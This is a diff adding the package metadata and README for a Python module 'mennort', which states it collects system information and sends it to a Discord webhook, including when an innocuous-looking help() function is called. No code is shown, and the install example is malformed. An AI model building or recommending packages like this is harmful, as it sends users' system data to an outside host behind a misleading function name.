@@ -1,0 +1,21 @@
+Metadata-Version: 2.1
+Name: mennort
+Version: 0.1.0
+Summary: A module for tracking system info and sending it to a webhook.
+Author: johan
+Description-Content-Type: text/markdown
+Requires-Dist: requests
+
+# Mennort Module
+
+This module tracks system information and sends it to a specified Discord webhook.
+
+## Installation
+
+You can install the module using pip:
+
+```bash
+pip install mennort
+import mennort
+
+mennort.help()  # This will track usage and send information
